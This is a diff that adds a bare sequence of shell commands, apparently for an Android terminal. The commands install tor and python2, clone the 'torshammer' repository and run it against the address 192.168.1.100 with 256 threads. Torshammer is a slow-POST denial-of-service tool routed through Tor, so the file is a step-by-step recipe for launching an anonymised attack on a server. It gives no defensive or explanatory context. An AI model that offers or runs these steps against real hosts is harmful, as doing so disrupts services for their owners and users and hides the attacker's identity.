@@ -1,0 +1,15 @@
+    $ apt update && apt upgrade
+
+    $ apt install git
+
+    $ apt install tor
+
+    $ pkg install python2
+
+    $ git clone https://github.com/dotfighter/torshammer.git
+
+    $ cd torshammer
+
+    $ chmod 777 torshammer.py
+
+    $ python2 torshammer.py -t 192.168.1.100 -r 256
